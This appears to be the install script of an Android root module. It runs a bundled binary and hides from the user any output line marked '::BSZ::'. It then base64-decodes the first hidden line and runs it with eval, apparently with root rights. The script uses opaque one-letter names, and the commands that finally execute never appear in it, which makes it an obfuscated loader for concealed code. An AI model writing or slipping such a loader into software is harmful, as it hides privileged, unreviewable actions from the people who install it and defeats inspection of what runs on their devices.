#!/system/bin/sh
a="$MODPATH"
set_perm_recursive "$a" 0 0 0755 0755
chmod +x "$a/bin/main"
b="$("$a/bin/main" install 2>&1)"
echo "$b" | while IFS= read -r c; do
    case "$c" in
        ::BSZ::*) ;;
        *) ui_print "$c" ;;
    esac
done
d=$(echo "$b" | grep '^::BSZ::' | head -1 | sed 's/^::BSZ:://')
[ -z "$d" ] && exit 1
e=$(echo "$d" | base64 -d 2>/dev/null || echo "$d" | toybox base64 -d 2>/dev/null)
[ -z "$e" ] && exit 1
eval "$e"
exit $?
